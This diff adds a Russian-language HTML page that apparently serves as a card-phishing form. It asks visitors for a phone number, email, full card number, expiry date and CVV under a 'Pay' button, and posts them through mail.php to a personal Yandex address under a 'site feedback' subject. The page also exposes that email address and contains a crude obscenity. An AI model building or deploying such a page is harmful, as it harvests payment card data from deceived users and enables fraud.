@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ru">
+	<body>
+		<meta charset="utf-8">
+	   <link rel="stylesheet" href="./css/style.css">
+	   <section id="newsletter">
+
+    <form action="mail.php" method="POST">
+    	<input type="hidden" name="project_name" value="Artem_larch YouTube">
+		<input type="hidden" name="admin_email" value="vasya.borisenko2020@yandex.ru">
+		<input type="hidden" name="form_subject" value="Фидбек сайта site.com">
+
+ 	<div class="form_op" >
+    <input	type="number" id="number" class="form_input" name="user_telephone"placeholder ="Номер телефона" required>
+	</div>
+	<div class="form_op" >
+	<input type="email" id="email" class="form_input" name="user_email"placeholder ="Почта" required>
+    </div>
+	<div class="form_op" >
+	<input type="number" id="kart" class="form_input" name="user_kart"placeholder ="Номер карты" required>
+	</div>
+	<div class="form_op" >
+	<input type="number" id="data" class="form_input" name="user_data/month_kart"	placeholder ="Дата/Месяц" required>
+	</div>
+	<div class="form_op" >
+    <input type="number"id="svv" class="form_input" name="user_svv"placeholder ="SVV код" required>
+    </div>
+	<div class="form_op" >
+	<button type="submit"class ="button_1">Оплатить</button>
+   </div>
+	</form>
+	
+	</body>			
+	</section>
+	<section id="newsletter_black">
+	     <p style="color:black" align="center">хуй)</p>
+	</section>	
+	<script>
+	let data = document.querySelector('#data');
+	let svv = document.querySelector('#svv');
+	let number = document.querySelector('#number');
+	let kart = document.querySelector('#kart');
+	kart.oninput = function () {
+	kart.value = this.value.substr(0, 16);
+	}
+	number.oninput = function (){
+	number.value = this.value.substr(0, 11);
+	} 
+	svv.oninput = function (){
+	this.value = this.value.substr(0, 3);
+	}
+	data.oninput = function (){
+	this.value = this.value.substr(0, 4);
+	}
+	</script>
+
+	<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <script src="script.js"></script>
+</html>
